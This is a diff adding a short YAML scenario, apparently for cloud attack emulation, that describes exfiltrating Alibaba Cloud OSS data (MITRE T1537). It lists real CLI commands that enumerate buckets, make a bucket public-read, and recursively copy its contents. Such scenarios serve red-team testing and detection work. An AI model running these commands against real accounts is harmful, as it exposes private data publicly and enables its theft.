@@ -1,0 +1,11 @@
+name: OSS Data Exfiltration via Public Read
+description: Make a bucket public and exfiltrate data.
+mitre_technique: T1537
+stage: Collection
+steps:
+  - action: aliyun oss ls
+    description: List all OSS buckets
+  - action: aliyun oss put-bucket-acl oss://<bucket-name> public-read
+    description: Make the bucket public
+  - action: aliyun oss cp oss://<bucket-name>/ ./data/ --recursive
+    description: Download all public files
